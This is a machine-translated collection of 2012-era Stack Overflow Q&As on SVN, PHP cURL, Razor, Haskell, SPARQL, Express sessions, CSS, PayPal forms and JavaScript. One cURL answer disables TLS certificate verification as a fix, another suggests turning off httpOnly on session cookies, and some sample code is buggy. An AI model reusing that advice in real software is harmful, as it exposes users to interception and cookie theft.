由于您只需要四条记录，因此您可以在每个查询中添加 TOP 4 子句以及 ORDER BY date DESC 以加快速度。

# svn - 如何使用 Emacs 23.1 内置集成设置 SVN 密码？

> ID：10148886
> 
> 赞同：3
> 
> 时间：2012-04-13T22:03:17.570
> 
> 标签：svn, emacs, passwords, integration

我正在使用提供 Emacs 23.1.1 的发行版和使用 svnserver 的 subversion 在 CentOS 6.2 上做一个项目。

我在任何地方都找不到如何设置存储库访问密码。[这里还有另一个问题（[SVN for Emacs: how do you set author name and save password?](https://stackoverflow.com/questions/726274/svn-for-emacs-how-do-you-set-author-name-and-save-password)）但对于我的情况没有可用的答案。]

**背景：**

由于客户交付要求，我需要*在安装中添加尽可能少的额外*内容 - 尽可能使用 yum install，如有必要，查找非 yum RPM，并作为最后的手段手动安装。

我正在使用带有 Syntevo 的 SmartSVN（非发行版添加的一个示例）的发行版中的颠覆（SVN）。它还要求我安装更新的 Java。

到目前为止，我还没有安装任何其他东西。

这一切正常，但能够直接从我在 Emacs 中的编辑会话中提交肯定会很好。

**看到的错误：**

当我使用 Ctl-x vv 提交时，我得到了提交消息缓冲区。

Ctl-c Ctl-c 失败并显示一条消息：签入失败。

*消息*显示

```
...
Press C-c C-c when you are done editing.
Enter a change comment.  Type C-c C-c when done
Checking in /home/keywords2/www/html/kw2Show.php...
vc-svn-checkin: Check-in failed
... 
```

*vc*节目

```
Authentication realm: <svn://localhost:3690> 47300edb-8fa2-460e-889a-ad1513dbfcdf
Password for 'keywords2': Authentication realm: <svn://localhost:3690> 47300edb-8fa2-460e-889a-ad1513dbfcdf
Username: svn: Commit failed (details follow):
svn: Can't read stdin: End of file found 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T23:04:57.333

我假设 Emacs 内部使用的是命令行客户端，你也可以直接使用它。

SVN 将凭据（取决于属性`store-auth-creds`）存储在`$HOME/.subversion/config`. SVN 只会询问密码，如果它还不知道的话。因此，从命令行调用一次 SVN 并输入密码。之后，您可以在没有密码的情况下使用 SVN - 从命令行以及 Emacs。

用一个简单的命令试试，例如`svn up`.

# c# - xCode 4.3 的 C# 插件

> ID：10148887
> 
> 赞同：1
> 
> 时间：2012-04-13T22:03:18.940
> 
> 标签：c#, xcode

我有一个 C# 算法，我需要使用 xCode IDE 将其包含在一个 Objective C 解决方案中。有没有可行的方法将此 C# 方法移植到 xCode 中？我没有看到对 Cocoa Sharp 的太多支持。

谢谢您的考虑....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T18:25:19.780

目前没有办法做到这一点。您可能可以使用单声道进行破解，但我强烈建议不要使用这种卷积。

# php - 为什么这个 cURL 请求在命令行上工作，而不是在 PHP 中？

> ID：10148895
> 
> 赞同：0
> 
> 时间：2012-04-13T22:04:14.713
> 
> 标签：php, xml, api, curl, highrise

我为 Highrise 的 API 编写了一个非常基本的包装类。它非常适合读取（GET），我刚刚开始测试它的创建（POST）。据我所知，这两个请求（一个在命令行上，一个通过 PHP 的 cURL 库）是相同的。相同的 XML，相同的选项集....只有一个有效，而另一个无效。

任何帮助表示赞赏。我也将这个问题发布到 37signals 开发者邮件列表，但是 stackoverflow 通常更快地发现我的愚蠢错误......

这是我在使用 PHP 的 cURL 时遇到的错误（让我认为 Highrise 在解析 XML 字符串时遇到了问题）：

```
<?xml version="1.0" encoding="UTF-8"?> <errors> <error>First name can't be blank</error> </errors> 
```

这是在命令行上起作用的：

```
curl -u 'my_api_key:X'
    -H 'Content-type: application/xml'
    -d '<?xml version="1.0" encoding="UTF-8"?> <person><first-name>Savos</first-name><last-name>Aren</last-name><title>Archmage</title><company-name>Winterhold College</company-name><contact-data><email-addresses/><phone-numbers><phone-number><number>555-555-5555</number><location>Home</location></phone-number><phone-number><number>555-555-5555</number><location>Work</location></phone-number><phone-number><number>555-555-5555</number><location>Mobile</location></phone-number></phone-numbers><addresses><address><city>Winterhold</city><country>Tamriel</country><state>Skyrim</state><street>Hall of the Elements, College of Winterhold</street><zip>99999</zip><location>Work</location></address></addresses></contact-data></person>'
    https://myuserid.highrisehq.com/people.xml 
```

这是我的包装类：

```
class HighriseAPICall {
    protected $_timeout = 120;
    protected $_url_prefix = 'https://';
    protected $_url_suffix = '.highrisehq.com';
    protected $_password = 'X';

    protected $_userpwd;
    protected $_url;

    public function __construct($api_key, $username) {
        $this->_userpwd= $api_key . ':' . $this->_password;
        $this->_url = $this->_url_prefix . $username . $this->_url_suffix;
    }

    /**
     * Make the specified API call.
     * @param string $action one of the four HTTP verbs supported by Highrise
     * @param string $resource_name the Highrise resource to be accessed
     * @param string $xml a well-formed XML string for a Highrise create, update, or delete request
     * 
     * $xml parameter should include any query parameters as suggested by Highrise API documentation
     * eg, if you want to GET all People, pass in "/people.xml"
     * and if you want to get People by search term where field=value,
     * then pass in "/people/search.xml?criteria[field]=value"
     */
    public function makeAPICall($action,$resource_name,$xml=null) {
        /* initialize curl session and set defaults for new API call */
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $this->_url . $resource_name);
        curl_setopt($curl, CURLOPT_USERPWD, $this->_userpwd);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $this->_timeout);
        /* if xml was passed in, set header and postfields */
        if (isset($xml)) {
            curl_setopt($curl, CURLOPT_HTTPHEADER, 'Content-type: application/xml');
            curl_setopt($curl, CURLOPT_POSTFIELDS, "$xml");
        }
        /* set action as custom request */
        curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $action);
        /* get the string response from executing the curl session */
        $result = curl_exec($curl);
        curl_close($curl);

        // return the response as a simpleXMLElement
        try {
                $result_simplexml = new SimpleXMLElement($result);
        }
        catch (Exception $e) {
                throw new Exception("Highrise API Call Error: " . $e->getMessage() . ", Response: " . $result);
        }
        if (!is_object($result_simplexml)) {
                throw new Exception("Highrise API Call Error: Could not parse XML, Response: " . $result);
        }
        return $result_simplexml;
    }

}
?> 
```

我正在使用的简单测试页：

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
    </head>
    <body>
        <?php
            require_once('HighriseAPICall.class.php');
            $highrise_api_key = 'OBSCURED';
            $highrise_username = 'OBSCURED';
            $highrise_api = new HighriseAPICall($highrise_api_key, $highrise_username);

            $person_xml ='<?xml version="1.0" encoding="UTF-8"?> <person><first-name>Savos</first-name><last-name>Aren</last-name><title>Archmage</title><company-name>Winterhold College</company-name><contact-data><email-addresses/><phone-numbers><phone-number><number>555-555-5555</number><location>Home</location></phone-number><phone-number><number>555-555-5555</number><location>Work</location></phone-number><phone-number><number>555-555-5555</number><location>Mobile</location></phone-number></phone-numbers><addresses><address><city>Winterhold</city><country>Tamriel</country><state>Skyrim</state><street>Hall of the Elements, College of Winterhold</street><zip>99999</zip><location>Work</location></address></addresses></contact-data></person>';

            $response = $highrise_api->makeAPICall('POST', '/people.xml', $person_xml);
            echo htmlentities($response->asXML());
        ?>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:10:32.383

试试这些行，而不是脚本中的内容

```
 if (isset($xml)) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/xml'));
        curl_setopt($curl, CURLOPT_POSTFIELDS, $xml);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST ,false);
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-16T17:10:32.400

在我的包装类中，该行：

```
curl_setopt($curl, CURLOPT_HTTPHEADER, 'Content-type: application/xml'); 
```

本来应该：

```
curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/xml')); 
```

# javascript - 如何在 C# Razor 视图中读取 HTML 标记值

> ID：10148896
> 
> 赞同：1
> 
> 时间：2012-04-13T22:04:24.303
> 
> 标签：javascript, jquery, html, c#-4.0, razor

我的跨度中有一个值，我想与 C# 变量进行比较，这可能吗？如果是，那么如何？

我可以在 Jquery 变量中获取 Html 标记值，但仍然无法将其与 Razor View 中的 C# 变量值进行比较。

```
HTML Tag: <span style="visibility: hidden" id="category">"Some Value"</span> 
```

C# 剃刀语法：

```
@foreach (var item in Model.InventoryViewModel.Items.Where(i => i.Category == "HTML Value"))
            {
// Some Code
} 
```

我正在尝试将 span 中的值与 C# 变量匹配，请提供任何帮助建议：\ !!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:10:04.443

不知道您在做什么，但您可以使用变量或其他东西，甚至更好地使用视图模型上的属性。无论如何，Razor 代码在服务器上运行，HTML 在客户端上，所以在 Razor 中比较 HTML 值就像鸡与蛋的问题。

因此，您可以使用视图模型的值生成 pan 标签：

```
<span style="visibility: hidden" id="category">
    @Model.SomeProperty
</span> 
```

然后你比较：

```
@foreach (var item in Model.InventoryViewModel.Items.Where(i => i.Category == Model.SomeProperty))
{            
    // Some Code
} 
```

但更好的是在控制器操作上执行此操作并直接过滤集合，以便您在视图中要做的就是：

```
@foreach (var item in Model.InventoryViewModel.FilteredItems)
{
    // Some Code
} 
```

甚至更短的使用模板：

```
@Html.EditorFor(x => x.InventoryViewModel.FilteredItems) 
```

# haskell - 是否存在与类型类相关的运行时惩罚？

> ID：10148897
> 
> 赞同：21
> 
> 时间：2012-04-13T22:04:27.037
> 
> 标签：haskell, typeclass

标题几乎总结了我的问题：是否存在与 Haskell 的类型类相关的运行时惩罚，或者它只是其中之一（如幻像类型）而没有任何运行时后果？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-13T22:16:36.473

需要一个类型类就像将一个额外的参数传递给包含类型类成员作为数据结构的函数，因为在幕后，这就是它在 GHC 中脱糖的内容。

也就是说，GHC 非常擅长内联和专门化使用类型类的代码到不成问题的程度，使用 -O2 很大一部分它们会消失，但即使没有那种优化级别，传递参数也很便宜.

所以开销不仅仅是幻像*类型*或新类型，但它不是很高。

顺便说一句，其他编译器的开销可能会有所不同。例如，JHC 使用有限形式的依赖类型有效地对类型构造函数执行案例分析，因此在 JHC 中工作时，您需要为受约束的类型变量的数量而不是约束的数量付费。

# rdf - 4store 支持 SPARQL 1.1？

> ID：10148899
> 
> 赞同：3
> 
> 时间：2012-04-13T22:04:40.607
> 
> 标签：rdf, sparql, 4store

我正在使用 BIND ( ) 从和到 4store 选择和插入三元组。

以下 SELECT 有效，

```
PREFIX Sensor: <http://cei.usc.edu/Equipment.owl#>
SELECT * 
WHERE {
    ?subject100 Sensor:test1 "100"
    BIND("1000" as ?x) .
} LIMIT 10 
```

但是当我尝试做一个 INSERT WHERE 时，它失败了

```
PREFIX Sensor: <http://cei.usc.edu/Equipment.owl#> 
INSERT {  
    ?subject Sensor:test510 ?value  . 
    }  
WHERE { 
    { 
    ?subject100 Sensor:test1 "100" . 
    BIND("200" as ?value)  
    } 
UNION
    { 
    ?subject99 Sensor:test1 "99" . 
    BIND("300" as ?value)  
    } 
    } 
```

错误：BIND 不能在操作 0 的第 1 行与 SPARQL 1.0 一起使用

我正在运行最新的 4Store v1.1.4 20-Sep-2011

我用不同的 SPARQL 存储尝试了上面的 INSERT WHERE 并且它有效。BIND 是 SPARQL 1.1 中的一个新结构，所以我不确定 4Store 是否支持它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-14T00:06:00.643

4store 1.1.4 不支持 BIND。它可能会在下一个版本中得到支持。已经有一些关于这个的讨论。

# session - Node.js expressjs 会话不会停留在 Firefox 中

> ID：10148901
> 
> 赞同：4
> 
> 时间：2012-04-13T22:04:42.870
> 
> 标签：session, node.js, cookies, express

我在 nodejs 中使用 express，并且会话不会停留在 Firefox 中。然而，在 Chrome 中工作正常。

我的 maxAge 为 14400000，我读过这可能是一个问题，因为我的本地机器在 GMT 上，但它似乎仍然没有坚持。

这是我配置的：

```
 app.use(express.cookieParser());
  app.use(express.session({ secret: 'mysecret', store: new RedisStore, cookie: { maxAge: 14400000 }})); 
```

我只是通过这样做来设置它：

```
req.session.user = 'something' 
```

任何想法这可能是什么？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T17:30:37.130

`req.session. regenerate(callback)`首次建立会话时尝试使用。它看起来像这样：

```
app.use(express.cookieParser());
app.use(express.session({ secret: 'mysecret', store: new RedisStore, cookie: { maxAge: 14400000 }}));

var user = //Define your user

req.session.regenerate(function() {
   req.session.user = user;
   res.redirect('/loggedin');
}); 
```

试试看！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-03-14T15:47:27.227

没有浪费时间，这里是修复：

```
app.use(
   session({
   httpOnly: false,
   secret: "top secret",
  })
 ); 
```

现在，如果您对真实故事感兴趣：

Mozilla 是一个严格的浏览器。她按规矩办事。如果某些东西在 Mozilla 中不起作用但在 chrome 中不起作用，则意味着您做错了。在生产环境中，我们设置 https 。默认情况下 express.session httpOnly 为真，只需将其设为假即可。:) 所以它也可以在 https 上工作。

# css - Safari 字体颜色

> ID：10148906
> 
> 赞同：-1
> 
> 时间：2012-04-13T22:05:17.613
> 
> 标签：css, fonts, safari

这在截至今天最新版本的 Fx、IE 和 Chrome 中呈现正常，但在 Safari 中则不行。这是为什么？

```
input#div-name {font-color: #666666;} 
```

使用 Safari，字体是#a9a9a9，我已经检查了该十六进制的所有相关 CSS 文件。

编辑：未知 javascript 中的模糊导致此问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T22:26:23.580

最明显的答案`font-color`是在任何浏览器中都不是公认的属性。如果你的真实代码有`color`，那么它也有一些覆盖这个设置的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:08:57.877

这很可能是由于您在 Safari 中的缓存。

如果您的旧 CSS 缓存在 Safari 中，则需要将其清除，以便新的 CSS 文件生效。

# php - json_decode 认为正常的字符串是有效的

> ID：10148913
> 
> 赞同：0
> 
> 时间：2012-04-13T22:05:49.390
> 
> 标签：php, php-5.3, json

似乎我的旧服务器会返回 NULL 或 false ......新服务器返回值，很奇怪。

```
var_dump(json_decode("this is a normal string, not JSON")); 
```

输出：

`string(33) "this is a normal string, not JSON"`

预期的：

`NULL`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T00:36:13.723

您还没有真正提出问题，但我还是尝试回答：

每个软件都包含错误。这很正常。我们共享代码，我们共享错误。你问的是 PHP 中一个已[报告并已修复](http://php.net/45989)的软件缺陷。升级您的 PHP 版本或忍受错误。

# html - 选择导致错误滚动的 InfoWindow 文本

> ID：10148914
> 
> 赞同：0
> 
> 时间：2012-04-13T22:05:52.887
> 
> 标签：html, google-maps, google-chrome, google-maps-api-3

我不确定这是否是 Chrome 或 Google Maps API 错误，但我在选择 InfoWindow 中的文本时观察到奇怪的行为，该文本有太多文本无法自然修复（因此创建了一个垂直滚动条）。发生这种情况的示例来自 Google Maps API 文档：

*   [https://google-developers.appspot.com/maps/documentation/javascript/examples/infowindow-simple-max](https://google-developers.appspot.com/maps/documentation/javascript/examples/infowindow-simple-max)

如果在访问该地图时您的浏览器窗口足够小，则单击标记应该会创建一个带有垂直滚动条的信息窗口。选择靠近顶部的文本不会导致滚动，但选择更下方的文本确实不应该滚动。如果我在可见区域的最底部选择文本，滚动的类型就是我所期望的（它会向下滚动以便可以选择更多的文本）。但是滚动开始得太早了。

当 InfoWindow 中有更多文本（需要更多垂直滚动才能看到全部内容）时，这似乎更加明显。与表单元素交互时也会出现问题（在输入字段中输入文本或选择下拉菜单）。关于如何解决此问题或问题可能出在哪里的任何建议？（即，它是 Chrome 或 Google Maps API 中的错误吗？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T00:02:59.737

似乎是一个 Chrome 错误。我会在[http://crbug.com/上提交它](http://crbug.com/)

# html - 强制 PayPal 始终请求信用卡信息而不是登录表单？

> ID：10148918
> 
> 赞同：11
> 
> 时间：2012-04-13T22:06:14.633
> 
> 标签：html, forms, variables, paypal

我们正在我们的网站上使用贝宝支付标准。当用户在我们的网站上填写他们的请求并按下贝宝按钮“立即购买”时，我们会将所有变量提交给贝宝，以便他们处理付款。

对于那些以前从未使用过贝宝并且通过我们的网站付款的用户，它运行良好，因为它会自动提示输入信用卡信息。

但是：对于那些在我们注意到 cookie 存储在计算机中之前已经在 paypal 中的用户，并且在询问他们的信用卡信息之前会提示用户自动登录。

我们希望贝宝始终要求提供信用卡信息并留下登录信息以使用贝宝付款。

我们可以发送任何变量到贝宝以迫使他们直接询问信用卡信息吗？

到目前为止，我们发现这些变量可以自动完成信用卡字段并且它们工作得很好：

```
<input type="hidden" name="country" value="" />
<input type="hidden" name="first_name" value="" />  
<input type="hidden" name="last_name"value="" />   
<input type="hidden" name="address1" value="" />
<input type="hidden" name="city" value="" />
<input type="hidden" name="state" value="" /> 
<input type="hidden" name="zip" value="" />
<input type="hidden" name="email" value="" />
<input type="hidden" name="night_phone_a" value="" />
<input type="hidden" name="night_phone_b" value="" />
<input type="hidden" name="night_phone_c" value="" /> 
```

对于那些寻找有关 PayPal 表单变量的更多信息的人，这里是参考：

[https://cms.paypal.com/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_html_formbasics](https://cms.paypal.com/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_html_formbasics)

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2014-12-10T11:53:18.837

我找到了 html-form 的解决方案，paypal*(!) 没有记录它：

```
<input type="hidden" name="landing_page" value="Login" />

or

<input type="hidden" name="landing_page" value="Billing" />
```

这祈祷贝宝登录以查看所需的表格。玩得开心。

* - 没有记录，但有[一些信息](https://www.paypal-community.com/t5/About-Payments-Archive/Guest-payement-is-not-available/td-p/807552?profile.language=en#M17338)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T22:13:35.267

根据其他答案、评论和投票结束，我认为有些混乱。

用户有两种合法的选择。输入付款信息或使用现有帐户登录。这可能会让用户感到困惑，他们可能知道也可能不知道/记住他们的登录信息。最后我检查了，您不需要 PayPal 帐户来使用 PayPal 标准付款（尽管我相信如果您不登录，CC# 和联系信息会根据现有帐户进行检查）。

为了回答最初的问题，我没有覆盖这种行为的第一手经验，但它可能是可能的。

[https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_nvp_r_SetExpressCheckout](https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_nvp_r_SetExpressCheckout)

（参见 LANDINGPAGE 参数）

> （可选）要显示的 PayPal 页面类型。它是以下值之一：
> 
> 计费 – 非 PayPal 账户登录 – PayPal 账户登录

Paypal 将始终倾向于鼓励现有用户登录（从营销/保留角度以及从安全角度来看，这很有意义）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-11T06:24:28.370

@Robert 在其中一条评论中写下了答案：LANDINGPAGE 是 Express Checkout 的参数，而不是网站支付标准的参数。网站付款标准不支持“LANDINGPAGE”的等效项。如果您想强制显示信用卡登陆页面，您需要集成 PayPal Express Checkout。

所以你去吧，@Robert，实际上这是我直接从 Paypal 得到的答案。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-13T22:18:51.213

不幸的是，这在设计上是不可能的。这不是为了安全，事实上，他们这样做是一个更加愤世嫉俗的原因：

PayPal 在所有信用卡交易中收取一小部分费用，因此上述*功能*实际上是一种隐蔽的尝试，旨在阻止用户使用信用卡。

最重要的是，您无能为力！PayPal 的 API 目前没有可供开发人员控制此行为的变量。

如果默认使用信用卡付款对您很重要，您可能需要考虑使用不同的付款工具，尽管在我看来，钱就是钱。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-04-13T22:08:22.510

可能不是。这是一项 PayPal 安全功能。世界上没有任何 cookie、会话或收集的信息比再次登录更安全。

# javascript - 同一页面上多个表单的简单可重用 javascript 平均函数

> ID：10148920
> 
> 赞同：1
> 
> 时间：2012-04-13T22:06:24.600
> 
> 标签：javascript, average

不到 48 小时前，我真的开始尝试自学 javascript。除了想学习它之外，我还有一个我正在从事的小型个人项目，并使用我的工作学习作为示例。但是我遇到了一个问题，我敢肯定这是相当基本的，我只是因为缺乏很多 javascript 知识而受到阻碍。

基本上这只是一个平均问题。
将有 4 个输入字段，第 4 个输入字段舍入到前三个字段的最接近整数平均值。
这 4 个字段配置将在页面上多次使用。
我希望它“实时”工作，而不是使用计算按钮，所以我假设需要“ **onKeyup** ”。（不需要任何形式的验证或提交或保存或任何东西）

我能够接近的唯一代码真的很丑，很长，而且很复杂。我不禁想到有一种非常简单的方法可以做到这一点，只需将相同的功能应用于每个输入分组即可。它看起来像下面，但可能更长。

```
some text
<input id="a" type="number" /><br/>
<input id="b" type="number" /><br/>
<input id="c" type="number" /><br/>
<input id="final" value="0" disabled />

some text
<input id="a" type="number" /><br/>
<input id="b" type="number" /><br/>
<input id="c" type="number" /><br/>
<input id="final" value="0" disabled /> 
```

提前致谢。这是一个更大问题的一部分，但我试图将它剥离到它的本质，并看到它的工作和理解它对帮助我解决其他一些问题大有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:34:02.553

这对于你的水平应该是可以理解的。第二组输入将使用 calc(2) 命名为 a-2，依此类推。

```
<input id="a-1" type="number" onkeyup="calc(1)" value="0" /><br/>
<input id="b-1" type="number" onkeyup="calc(1)" value="0" /><br/>
<input id="c-1" type="number" onkeyup="calc(1)" value="0" /><br/>
<input id="final-1" value="0" disabled />

function calc( n ) {
    var a = document.getElementById("a-" + n ).value;
    var b = document.getElementById("b-" + n ).value;
    var c = document.getElementById("c-" + n ).value;
    document.getElementById("final-" + n ).value = Math.round((parseInt(a)+parseInt(b)+parseInt(c))/3);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:24:29.670

首先使用不同的标记，每个页面应该只有一个 id，所以使用类，它也可以更容易地定位所有内容。此外，如果效果是使用最后一个输入作为显示，您可以使用 readonly 而不是 disabled

```
<p>some text</p>
<div class="group">
    <input class="a" type="number" /><br/>
    <input class="b" type="number" /><br/>
    <input class="c" type="number" /><br/>
    <input class="final" value="0" readonly />
</div>
<p>some text</p>
<div class="group">
    <input class="a" type="number" /><br/>
    <input class="b" type="number" /><br/>
    <input class="c" type="number" /><br/>
    <input class="final" value="0" readonly />
</div>​ 
```

这是在 jquery 中完成的示例

```
$(function() {
    $('.group input').on('click', function() {
        var count = parseInt($(this).val()) || 0;
        $(this).siblings(':not(.final)').each(function() {
            if ($(this).val()) count = count + parseInt($(this).val());
        });
        $(this).siblings('.final').eq(0).val(count);
    });
}); 
```

演示在这里：http: [//jsfiddle.net/4S4Vp/1/](http://jsfiddle.net/4S4Vp/1/) ​</p>

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T22:32:38.667

我希望将此标记为重复，但由于[此答案](https://stackoverflow.com/questions/5050781/mapreduce-how-do-i-calculate-relative-values-average-top-k-and-so)没有代码，请享受：

```
// find all inputs in the page and gather data trying to convert it to number
var data = [].map.call( document.querySelectorAll('input'), function (v) {
    if (typeof v.value * 1 === 'NaN') {
        return 'NaN';
    }
    return v.value * 1;         
});
// not all data will be valid, so we filter it
data = data.filter( function (v) {
   return !isNaN(v);
});
// and then calculate average
var avg = data.reduce( function (v, v1) {
    return v + v1;
}) / data.length; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T22:23:11.910

这真的又快又脏，但如果你知道你有多少输入，这应该可以工作：

```
// these would instead be your textboxes
​var a = document.getElementById('a').value();
var b = document.getElementById('b').value();
var c = document.getElementById('c').value();

var avg = (a+b+b)/3;

document.getElementById('c').value() = avg; 
```

这是一个[jsfiddle](http://jsfiddle.net/yCU3S/)，因此您可以使用这个想法，看看它是否按您的意愿工作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-13T22:24:22.377

使用[jQuery](http://jquery.com/)。

在 jsfiddle 上查看[现场演示](http://jsfiddle.net/a875A/7/)

```
some text
<div id="div1">
<input id="a" type="number" /><br/>
<input id="b" type="number" /><br/>
<input id="c" type="number" /><br/>
<input id="final" value="0" disabled />
</div>
some text
<div id="div2">
<input id="a" type="number" /><br/>
<input id="b" type="number" /><br/>
<input id="c" type="number" /><br/>
<input id="final" value="0" disabled />
</div>​

<script type="text/javascript">

$("#div1 input").bind('change keyup click',function(){
    var final = 0;
    $("#div1 input").not("#div1 #final").each(function(idx,el){
        final += (el.value) ? parseInt(el.value) : 0;
    });
    $("#div1 #final").val(final/3);
});
$("#div2 input").bind('change keyup click',function(){
    var final = 0;
    $("#div2 input").not("#div2 #final").each(function(idx,el){
        final += (el.value) ? parseInt(el.value) : 0;
    });
    $("#div2 #final").val(final/3);
});
​&lt;/script> 
```

# uisearchbar - UISearchBar - 没有搜索文本时显示所有行

> ID：10148921
> 
> 赞同：2
> 
> 时间：2012-04-13T22:06:26.270
> 
> 标签：uisearchbar

我正在使用带有两个范围按钮的 UISearchBar。即使没有搜索文本，我也想使用范围按钮来过滤行。现在，只有在有搜索文本时才会过滤行。从调试中看来，searchResultsTableView 的帧大小为零。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-09T14:26:55.093

为此，请保存一个包含所有数据的数组。在 textDidChange 当 searchText.length == 0 时显示所有副本而不是搜索结果数组

```
- (void)searchBar:(UISearchBar *)searchBar textDidChange:(NSString *)searchText
{

    if (searchText.length == 0) {
        tableSource = [NSMutableArray arrayWithArray: self.homeSheets.data];
        [self.tableView reloadData];
        return;
    }

    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-10T11:00:22.760

看一下这个...

**在 ViewController.h 文件中：**

```
@interface ViewController : UITableViewController <UISearchBarDelegate, UISearchDisplayDelegate>
{
    UISearchBar *searchBar;
    UISearchDisplayController *searchDisplayController;
}

@property (nonatomic, retain) NSArray *friendsArray;
@property (nonatomic, retain) NSArray *searchResults;

- (void)filterContentForSearchText:(NSString*)searchText scope:(NSString*)scope; 
```

**在 ViewController.m 文件中：**

```
- (id)initWithStyle:(UITableViewStyle)style
{
    self = [super initWithStyle:style];
    if (self) {

        self.friendsArray = [[NSArray alloc]initWithObjects:@"Napoli",@"Juventus",@"Inter",@"Milan", @"Lazio",@"Real Madrid",@"Barcelona",@"Villareal",@"Valencia",@"Deportivo",@"Manchester City",@"Manchester United",@"Chelsea",@"Arsenal",@"Liverpool", nil];
        self.searchResults = [[NSArray alloc] init];

    }
    return self;
}
- (void)viewDidLoad
{
    [super viewDidLoad];

    searchBar = [[UISearchBar alloc] initWithFrame:CGRectMake(0, 0, 160, 44)];
    searchDisplayController = [[UISearchDisplayController alloc] initWithSearchBar:searchBar contentsController:self];

    searchDisplayController.delegate = self;
    searchDisplayController.searchResultsDataSource = self;

    self.tableView.tableHeaderView = searchBar;

}

#pragma mark - Table view data source

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{

    if (tableView == self.searchDisplayController.searchResultsTableView) {
        return [self.searchResults count];

    } else {
        return [self.friendsArray count];

    }

}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
    }

    // Configure the cell...

    if (tableView == self.searchDisplayController.searchResultsTableView) {
        cell.textLabel.text = [self.searchResults objectAtIndex:indexPath.row];
    } else {
        cell.textLabel.text = [self.friendsArray objectAtIndex:indexPath.row];
    }

    return cell;
}

#pragma mark - searchDisplayControllerDelegate

-(BOOL)searchDisplayController:(UISearchDisplayController *)controller
shouldReloadTableForSearchString:(NSString *)searchString
{
    [self filterContentForSearchText:searchString
                               scope:[[self.searchDisplayController.searchBar scopeButtonTitles]
                                      objectAtIndex:[self.searchDisplayController.searchBar
                                                     selectedScopeButtonIndex]]];

    return YES;
}

- (void)filterContentForSearchText:(NSString*)searchText scope:(NSString*)scope
{
    NSPredicate *resultPredicate = [NSPredicate
                                    predicateWithFormat:@"SELF contains[cd] %@",
                                    searchText];

    self.searchResults = [self.friendsArray filteredArrayUsingPredicate:resultPredicate];
} 
```

# jquery - IE 8 和文本褪色

> ID：10148923
> 
> 赞同：1
> 
> 时间：2012-04-13T22:07:02.433
> 
> 标签：jquery, internet-explorer

我在 IE 8、7 和 6（显然）中遇到了淡化文本的问题。在动画过程中，文本有一个黑色轮廓，完全破坏了效果。有解决方法吗？我已经阅读了很多关于这个问题的答案，但没有一个是有意义的。请在 IE 8 中查看这个简单的 jsFiddle [http://jsfiddle.net/LhSK7/](http://jsfiddle.net/LhSK7/)，如果可能的话，请告诉我如何修复它。

编辑：问题的屏幕截图：http: [//i43.tinypic.com/1z6h1th.png](http://i43.tinypic.com/1z6h1th.png) 我认为这可能是因为 VirtualBox，但所有其他浏览器在 VirtualBox 中正确显示它。

编辑#2：这个问题可以通过设置元素*的*背景颜色来解决，虽然在 IE 8 及以下版本中仍然很丑，但至少摆脱了黑色轮廓。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:27:36.963

如果您可以将背景颜色设置为#content，那应该可以（至少在 IE8 中，我手头没有旧版本可供检查）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T23:25:36.500

将微软过滤器添加到您的“容器”中，您将获得流畅的动画:) 您甚至可以将它放在仅 IE 标记之间...

```
<!--[if IE]>
#container {
 font-family:"Times New Roman",Georgia,Serif;font-size:40px;
